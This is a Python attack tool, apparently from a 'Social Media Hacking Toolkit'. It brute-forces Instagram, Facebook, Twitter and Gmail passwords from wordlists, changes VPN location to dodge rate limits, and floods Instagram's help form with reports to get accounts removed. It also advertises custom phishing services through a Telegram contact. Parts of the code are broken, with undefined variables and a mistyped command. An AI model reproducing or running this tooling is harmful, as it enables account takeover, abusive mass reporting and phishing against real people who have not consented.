from rich.console import Console
import time
import os 
import random
import distro
import requests
from asciiart import ascii_art
from bs4 import BeautifulSoup
import instaloader
import smtplib
import chardet

os.system("clear")

def detect_file_encoding(file_path):
    with open(file_path, 'rb') as f:
        result = chardet.detect(f.read())
        return result['encoding'] # returns encoding to be used

class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
   CYAN_BG = '\33[1;37;40m'

console = Console()

#windscribe vpn random country
codeList = ["TR", "US-C", "US", "US-W", "CA", "CA-W", "FR", "DE", "NL", "NO", "RO", "CH", "GB", "HK"]
choiceCode = random.choice(codeList)


def change_ip():
  if "Arch" in distro.linux_distribution()[0]:
    os.system("sudo systemctl start windscribe")
  os.system("\nwindscribe connect " + choiceCode)

def start():


  console.print(ascii_art, justify="center", style="#B0DAFF bold")


  tasks = [f"task {n}" for n in range(1, 2000)]
  console.print("", justify="center", end="")

  with console.status("[purple bold]", spinner = 'arc') as status:
      while tasks:
          console.print("", justify="center", end="")
          task = tasks.pop(0)
          time.sleep(0.001)


def c1():
  console.print(":: 1 instagram | 2 facebook | 3 gmail | 4 twitter ::", justify="center", style="#B0DAFF")
  try:
    choice = int(input("\n\n"+color.GREEN+" [choice]"+color.END+" 〉"))
  except ValueError:
    print("\n\nERROR 0x01:"+color.RED+" please enter a number\n\n"+color.END)
    exit()
  if choice > 4 or choice < 1:
    print("\n\nEERROR 0x02:"+color.RED+" please enter a number between 1-4\n\n"+color.END)
    exit()

  return choice

def vpn_error():
  print("\n\nERROR 0x03: "+color.RED+"Unable to enable VPN on Windows\n\n"+color.END)
  exit()

def c_vpn():
  os.system("clear")
  console.print(ascii_art, justify="center", style="#B0DAFF bold")
  console.print(":: 0 vpn off | 1 vpn on ::", justify="center", style="#B0DAFF")
  try:
    choice = int(input("\n\n"+color.GREEN+" [choice]"+color.END+" 〉"))
  except ValueError:
    print("\n\nERROR 0x02:"+color.RED+" please enter a number between 0-1\n\n"+color.END)
    exit()
  if choice > 1 or choice < 0:
    print("\n\nERROR 0x02:"+color.RED+" please enter a number between 0-1\n\n"+color.END)
    exit()

  return choice


def start_instagram():
  os.system("clear")
  console.print(ascii_art, justify="center", style="#B0DAFF bold")
  console.print(":: 1 bruteforce | 2 mass report | 3 phishing ::", justify="center", style="#B0DAFF")
  try:
    choice = int(input("\n\n"+color.GREEN+" [choice]"+color.END+" 〉"))
  except ValueError:
    print("\n\nERROR 0x02:"+color.RED+" please enter a number\n\n"+color.END)
    exit()
  if choice > 3 or choice < 1:
    print("\n\nEERROR 0x01:"+color.RED+" please enter a number between 1-3\n\n"+color.END)
    exit()

  return choice
def get_facebook():
  os.system("clear")
  console.print(ascii_art, justify="center", style="#B0DAFF bold")
  console.print(":: username ::", justify="center", style="#B0DAFF")
  uname = input("\n\n"+color.GREEN+" [choice]"+color.END+" 〉")
def get_email():
  os.system("clear")
  console.print(ascii_art, justify="center", style="#B0DAFF bold")
  console.print(":: email ::", justify="center", style="#B0DAFF")
  uname = input("\n\n"+color.GREEN+" [choice]"+color.END+" 〉")
  return uname
def get_username():
  os.system("clear")
  console.print(ascii_art, justify="center", style="#B0DAFF bold")
  console.print(":: username ::", justify="center", style="#B0DAFF")
  uname = input("\n\n"+color.GREEN+" [choice]"+color.END+" 〉@")
  return uname

def get_wordlist():
  os.system("clear")
  console.print(ascii_art, justify="center", style="#B0DAFF bold")
  console.print(":: wordlist ::", justify="center", style="#B0DAFF")
  wordlist = input("\n\n"+color.GREEN+" [choice]"+color.END+" 〉")
  return wordlist

def insta_bruteforce(username, wordlist, vpn):
  spam_bool = 1
  c_spam = 0

  wordlist_path = "wordlist/"+wordlist
  file_encoding = detect_file_encoding(wordlist_path)

  try:
      wl_file = open(wordlist_path, 'r', encoding=file_encoding) # fixed encoding issue
      wl_lines = [line.strip() for line in wl_file.readlines()]  # Rimuovi i caratteri di nuova riga
      count = 0
  except FileNotFoundError:
      print("\n\nEERROR 1x01:"+color.RED+" wordlist not found, please insert your wordlist into the 'wordlist' folder.\n\n"+color.END)
      exit()

  # Handle the error
  except UnicodeDecodeError as e:
    print(f"Error decoding the file: {e}")  

  rs = requests.session()
  for line in wl_lines:
      password = line
      if c_spam > 100 and spam_bool == 1:
        if os.path.exists("cmd/spam_message.check") == True:
          spam_bool = 0
          console.print("\n!! README !!", justify="center", style="#d3c906 bold")
          console.print(spam_message_br, justify="center", style="#fc0004 bold")
          console.print("for any request$ contact on telegram @zztaKdeR \n\n", justify="center", style="#0befe0 italic")
          stop_message = input("permanently stop this message [y/n] ==> ")
          if stop_message == "y":
            os.remove("cmd/spam_message.check")
      elif insta_pass(username, line) == True:
        os.system("clear")
        console.print(ascii_art, justify="center", style="#B0DAFF bold")
        console.print(password, justify="center", style="#13f41e bold")
        exit()
      elif insta_pass(username, line) == False:
        os.system("clear")
        console.print(ascii_art, justify="center", style="#B0DAFF bold")
        console.print(line, justify="center", style="#ea0408 bold")
        c_spam = c_spam + 1
        if vpn == True:
          change_ip()
        
def insta_pass(USER, PASSWORD):
  L = instaloader.Instaloader()
  try:
    L.login(USER, PASSWORD)
    return 1
  except Exception as e:
    if "Checkpoint" in str(e):
      return 1
    elif "incorrect" in str(e):
      return 0
    elif "blocked" in str(e):
      return 0
    else:
      return 0
    


page_headers = {
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
"Accept-Encoding": "gzip, deflate",
"Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3",
"Cache-Control": "no-cache",
"Connection": "keep-alive",
"DNT": "1",
}

report_headers = {
"Accept": "*/*",
"Accept-Encoding": "gzip, deflate",
"Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3",
"Cache-Control": "no-cache",
"Connection": "keep-alive",
"Content-Type": "application/x-www-form-urlencoded",
"DNT": "1",
"Host": "help.instagram.com",
"Origin": "help.instagram.com",
"Pragma": "no-cache",
"Referer": "https://help.instagram.com/contact/497253480400030",
"TE": "Trailers",
}

nu = [1, 2, 3, 4]

spam_message = '''
you seem to have been trying for a long time to report an account....

How does the mass report attack work?

===================================

"Accept": "*/*",
"Accept-Encoding": "gzip, deflate",
"Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3",
"Cache-Control": "no-cache",
"Connection": "keep-alive",
"Content-Type": "application/x-www-form-urlencoded",
"DNT": "1",
"Host": "help.instagram.com",
"Origin": "help.instagram.com",
"Pragma": "no-cache",
"Referer": "https://help.instagram.com/contact/497253480400030",
"TE": "Trailers",

===================================

[more info here --> https://github.com/RedKatz/SocialMediaHackingToolkit#readme]

These headers contain information about the request and can be used to communicate
specific instructions or preferences to the server.

this is not the most efficient way to knock down an account, but it is
the method that allows you to report an account for free, it is more
efficient to have a list of thousands of account ready to report an account all at the same time.

do you want a custom program? or do you want to run any
program you want in a private server that changes ip every time?
'''
spam_message_br = '''
you seem to have been trying for a long time to bruteforce an account....

How does the mass bruteforce attack work?

===================================

'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
'content-length': '275',
'content-type': 'application/x-www-form-urlencoded',
'cookie': 'csrftoken=DqBQgbH1p7xEAaettRA0nmApvVJTi1mR; ig_did=C3F0FA00-E82D-41C4-99E9-19345C41EEF2; mid=X8DW0gALAAEmlgpqxmIc4sSTEXE3; ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36',
'x-csrftoken': 'DqBQgbH1p7xEAaettRA0nmApvVJTi1mR',
'x-ig-app-id': '936619743392459',
'x-ig-www-claim': '0',
'x-instagram-ajax': 'bc3d5af829ea',
'x-requested-with': 'XMLHttpRequest'

===================================

[more info here --> https://github.com/RedKatz/SocialMediaHackingToolkit#readme]

These headers contain information about the request and can be used to communicate
specific instructions or preferences to the server.

this is one of the most efficient way to bruteforce an account, you can
also perform brutefforce attacks with 2fa cracking.

do you want a custom program? or do you want to run any
program you want in a private server that changes ip every time?
'''

def get_amount():
  os.system("clear")
  console.print(ascii_art, justify="center", style="#B0DAFF bold")
  console.print(":: amount ::", justify="center", style="#B0DAFF")
  try:
    amount = int(input("\n\n"+color.GREEN+" [choice]"+color.END+" 〉"))
  except ValueError:
    print("\n\nERROR 2x00:"+color.RED+" please enter a number\n\n"+color.END)
    exit()
  return amount


def insta_massreport(username, vpn, amount, spam_bool):
     
     c_while = 0
     while c_while <= amount:
          if c_while < 0:
            c_while = 0
          elif c_while > 100 and spam_bool == 1:
            if os.path.exists("cmd/spam_message.check") == True:
              spam_bool = 0
              console.print("\n!! README !!", justify="center", style="#d3c906 bold")
              console.print(spam_message, justify="center", style="#fc0004 bold")
              console.print("for any request$ contact on telegram @username\n\n", justify="center", style="#0befe0 italic")
              stop_message = input("permanently stop this message [y/n] ==> ")
              if stop_message == "y":
                os.remove("cmd/spam_message.check")
          if vpn == True:
               change_ip()
      


          try:
               lsd = res.text.split('["LSD",[],{"token":"')[1].split('"},')[0]
               spin_r = res.text.split('"__spin_r":')[1].split(',')[0]
               spin_b = res.text.split('"__spin_b":')[1].split(',')[0].replace('"',"")
               spin_t = res.text.split('"__spin_t":')[1].split(',')[0]
               hsi = res.text.split('"hsi":')[1].split(',')[0].replace('"',"")
               rev = res.text.split('"server_revision":')[1].split(',')[0].replace('"',"")
               datr = res.cookies.get_dict()["datr"]
          except:
               if random.choice(nu) == 2:
                os.system("clear")
                console.print(ascii_art, justify="center", style="#B0DAFF bold")
                console.print("[ "+str(c_while)+" ]", justify="center", style="#f70202 bold")
                c_while = c_while-2
               else:
                os.system("clear")
                console.print(ascii_art, justify="center", style="#B0DAFF bold")
                console.print("[ "+str(c_while)+" ]", justify="center", style="#23f702 bold")
                time.sleep(random.choice(nu))



          try:
               res = ses.post(
                    "https://help.instagram.com/ajax/help/contact/submit/page",
                    data=report_form,
                    headers=report_headers,
                    cookies=report_cookies,
                    timeout=10
               )
          except:
            if random.choice(nu) == 2:
              time.sleep(random.choice(nu))

            else:
              time.sleep(2)


          c_while = c_while+1

phishing_help = '''
Phishing Tool Under Development! We are currently working on implementing the following phishing code: https://github.com/RedKatz/exaPhisher. 
If you'd like to contribute, please feel free to create a pull request. Thank you for your patience and understanding!
'''
spam_phishing = '''
For customized phishing programs targeting specific websites, please contact us on Telegram at @username.
We provide tailored phishing solutions.

https://t.me/zztaKdeR
'''

facebook_ju  = '''
Facebook mass report Tool Under Development! We are currently working on implementing thath function. 
If you'd like to contribute, please feel free to create a pull request. Thank you for your patience and understanding!
'''
twitter_ju  = '''
Twitter mass report Tool Under Development! We are currently working on implementing thath function. 
If you'd like to contribute, please feel free to create a pull request. Thank you for your patience and understanding!
'''

gmail_ju  = '''
Gmail mass report Tool Under Development! We are currently working on implementing thath function. 
If you'd like to contribute, please feel free to create a pull request. Thank you for your patience and understanding!
'''


facebook_ju_phishing  = '''
Phishing Tool Under Development! We are currently working on implementing the following phishing code: https://github.com/RedKatz/exaPhisher. 
If you'd like to contribute, please feel free to create a pull request. Thank you for your patience and understanding!
'''



def insta_phishing():
  os.system("clear")
  console.print(ascii_art, justify="center", style="#B0DAFF bold")
  console.print(phishing_help, justify="center", style="#B0DAFF")
  console.print(spam_phishing, justify="center", style="#f91713")

def facebook_massreport():
  os.system("clear")
  console.print(ascii_art, justify="center", style="#B0DAFF bold")
  console.print(facebook_ju, justify="center", style="#B0DAFF")

def twitter_massreport():
  os.system("clear")
  console.print(ascii_art, justify="center", style="#B0DAFF bold")
  console.print(twitter_ju, justify="center", style="#B0DAFF")


def facebook_phishing():
  os.system("clear")
  console.print(ascii_art, justify="center", style="#B0DAFF bold")
  console.print(facebook_ju_phishing, justify="center", style="#B0DAFF")
  console.print(spam_phishing, justify="center", style="#f91713")

def twitter_phishing():
  os.system("clear")
  console.print(ascii_art, justify="center", style="#B0DAFF bold")
  console.print(facebook_ju_phishing, justify="center", style="#B0DAFF")
  console.print(spam_phishing, justify="center", style="#f91713")


POST_URL = 'https://www.facebook.com/login.php'

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}

def create_form():
    form = dict()
    cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}

    data = requests.get(POST_URL, headers=HEADERS)
    for i in data.cookies:
        cookies[i.name] = i.value
    data = BeautifulSoup(data.text, 'html.parser').form
    if data.input['name'] == 'lsd':
        form['lsd'] = data.input['value']
    return form, cookies

def is_this_a_facebook_password(email, index, password):
    global PAYLOAD, COOKIES
    if index % 10 == 0:
        PAYLOAD, COOKIES = create_form()
        PAYLOAD['email'] = email
    PAYLOAD['pass'] = password
    r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
    if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
        open('temp', 'w').write(str(r.content))
        console.print(password, justify="center", style="#13f41e bold")
    console.print(password, justify="center", style="#ea0408 bold")
    if random.choice(nu) == 2:
      time.sleep(5)
    else:
      time.sleep(2)


def facebook_bruteforce(username, wordlist, vpn):
  try:
    wl_file = open("wordlist/"+wordlist, 'r')
    wl_lines = wl_file.readlines()
    count = 0
  except FileNotFoundError:
    print("\n\nEERROR 1x01:"+color.RED+" wordlist not found, please insert your wordlist in 'wordlist' folder.\n\n"+color.END)
    exit() 
  for passw in wl_lines:
    os.system("clear")
    console.print(ascii_art, justify="center", style="#B0DAFF bold")
    is_this_a_facebook_password(username, 10, passw)
    if vpn == True:
      change_ip()

def twitter_bruteforce(username, wordlist, vpn):
  try:
      wl_file = open("wordlist/"+wordlist, 'r')
      wl_lines = [line.strip() for line in wl_file.readlines()]  # Rimuovi i caratteri di nuova riga
      count = 0
  except FileNotFoundError:
      print("\n\nEERROR 1x01:"+color.RED+" wordlist not found, please insert your wordlist in 'wordlist' folder.\n\n"+color.END)
      exit()  
  for password in wl_lines:  
     data = {"session[username_or_email]":username,
        "session[password]":password}
     r = requests.post("https://twitter.com/login/", data=data)

     if ("success" in r.text):
        os.system("clear")
        console.print(ascii_art, justify="center", style="#B0DAFF bold")
        print(color.GREEN+"Password finded: "+color.END+password)
     else:
        os.system("clear")
        console.print(ascii_art, justify="center", style="#B0DAFF bold")
        console.print(password, justify="center", style="#ea0408 bold")

     #CHANGE URL AND INPUT PASSWORD
     data = {"auth_password":password}
     r = requests.post("https://twitter.com/settings/your_twitter_data", data=data)

     if ("success" in r.text):
        os.system("clear")
        console.print(ascii_art, justify="center", style="#B0DAFF bold")
        console.print(password, justify="center", style="#13f41e bold")
        sys.exit(0)
     if vpn == True:
      change_ip()




def gmail_bruteforce(username, wordlist, vpn):
  try:
    wl_file = open("wordlist/"+wordlist, 'r')
    wl_lines = wl_file.readlines()
    count = 0
  except FileNotFoundError:
    print("\n\nEERROR 1x01:"+color.RED+" wordlist not found, please insert your wordlist in 'wordlist' folder.\n\n"+color.END)
    exit() 
  for password in wl_lines:
      try:
          session = smtplib.SMTP('smtp.gmail.com', 587) #use gmail with port
          session.starttls() #enable security
          session.login(username, password) #logi
          os.system("clearr")
          console.print(ascii_art, justify="center", style="#B0DAFF bold")
          console.print(password, justify="center", style="#13f41e bold")
          exit()

      except Exception:
          os.system("clear")
          console.print(ascii_art, justify="center", style="#B0DAFF bold")
          console.print(password, justify="center", style="#ea0408 bold")
          if vpn == True:
              change_ip()
          time.sleep(random.choice(nu))

def gmail_massreport():
  os.system("clear")
  console.print(ascii_art, justify="center", style="#B0DAFF bold")
  console.print(gmail_ju, justify="center", style="#B0DAFF")


def gmail_phishing():
  os.system("clear")
  console.print(ascii_art, justify="center", style="#B0DAFF bold")
  console.print(facebook_ju_phishing, justify="center", style="#B0DAFF")
  console.print(spam_phishing, justify="center", style="#f91713")
